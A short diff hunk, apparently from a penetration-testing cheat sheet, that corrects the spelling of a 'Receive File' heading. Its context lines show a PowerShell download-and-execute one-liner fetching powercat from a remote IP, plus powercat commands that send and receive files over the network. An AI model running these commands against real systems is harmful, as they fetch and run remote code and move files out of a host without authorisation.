@@ -655,7 +655,7 @@ IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.16.5/powercat
 # Send File:
 powercat -c 10.1.1.1 -p 443 -i C:\inputfile
 
-# Recieve File:
+# Receive File:
 powercat -l -p 8000 -of C:\inputfile
 ```
 
